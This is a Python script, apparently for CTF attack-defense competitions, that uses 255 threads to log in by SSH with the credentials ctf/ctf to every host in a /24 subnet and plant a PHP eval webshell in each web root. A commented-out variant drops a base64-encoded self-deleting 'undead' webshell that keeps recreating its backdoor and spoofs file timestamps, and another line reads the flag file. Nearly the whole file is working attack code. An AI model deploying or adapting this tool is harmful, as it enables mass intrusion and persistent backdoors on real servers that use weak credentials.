#-*- coding:utf-8 -*-
import paramiko
import threading
import queue

#反弹shell python
q=queue.Queue()
#lock = threading.Lock()

#private_key_path = '/home/auto/.ssh/id_rsa'  # 如果要用密钥登录
#private_key_path = "D:\\id_rsa.txt"
#key = paramiko.RSAKey.from_private_key_file(private_key_path)

# ssh 用户名 密码 登陆
def ssh_base_pwd(ip,port,username,passwd,cmd):
    port = int(port)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(hostname=ip, port=port, username=username, password=passwd)
    #ssh.connect(hostname=ip, port=port, username=username, key_filename=key)
    stdin,stdout,stderr = ssh.exec_command(cmd)
    result = stdout.read()
    if not result :
        result = stderr.read()
    ssh.close()
    return result.decode()

def main(x):
    cmd = 'cd ../../var/www/html ; echo "<?php @eval(\$_POST[password]); ?>" > .config.php ; '   #批量在文件目录下写入webshell
    #下面这条语句是写不死马，位置放在/var/www/html/.content.php
    # cmd = 'echo "PD9waHAKCSAgICBpZ25vcmVfdXNlcl9hYm9ydCh0cnVlKTsKCSAgICBzZXRfdGltZV9saW1pdCgwKTsKCSAgICB1bmxpbmsoX19GSUxFX18pOwoJICAgICRmaWxlID0gJy5jb25maWcucGhwJzsKCSAgICAkY29kZSA9ICc8P3BocCBpZihtZDUoJF9HRVRbInBhc3MiXSk9PSIxYTFkYzkxYzkwNzMyNWM2OTI3MWRkZjBjOTQ0YmM3MiIpe0BldmFsKCRfUE9TVFthXSk7fSA/Pic7CgkgICAgLy9wYXNzPXBhc3MKCSAgICB3aGlsZSAoMSl7CgkgICAgICAgIGZpbGVfcHV0X2NvbnRlbnRzKCRmaWxlLCRjb2RlKTsKCSAgICAgICAgc3lzdGVtKCd0b3VjaCAtbSAtZCAiMjAyMi0xMC0wMSAwOToxMDoxMiIgLmNvbmZpZy5waHAnKTsKCSAgICAgICAgdXNsZWVwKDUwMDApOwoJICAgIH0KPz4K" | base64 -d > /var/www/html/.content.php'
    # cmd = 'cat /www/admin/flag.txt'           #读取txt文件

    port = '22'
    username = 'ctf'
    passwd = 'ctf'

    ip = '10.1.1.{}'.format(x)
    q.put(ip.strip(),block=True, timeout=None)
    ip_demo=q.get()
    #判断是否成功
    try:
        #lock.acquire()
        res = ssh_base_pwd(ip_demo,port,username,passwd,cmd)
        if res:
            print("[ + ]Ip: %s" % ip_demo +" is success!!! [ + ]")
            #lock.release()
            #result = ssh_base_pwd(ip_demo,port,username,passwd,cmd)
            print(res)
            # 打印内容在E盘下
            with open("E:\\result.txt","a",encoding='utf-8') as f:
                f.write('%s,%s'%(ip_demo,res)+"\n")
    except:
        print("[ - ]Ip: %s" % ip_demo +" is Failed")
    if x > 255:
        print("Finshed!!!!!!!!")
    q.task_done()

#线程队列部分
th=[]
th_num=255
for x in range(th_num):
        t=threading.Thread(target=main,args=(x,))
        th.append(t)
for x in range(th_num):
        th[x].start()
for x in range(th_num):
        th[x].join()

#q.join()所有任务完成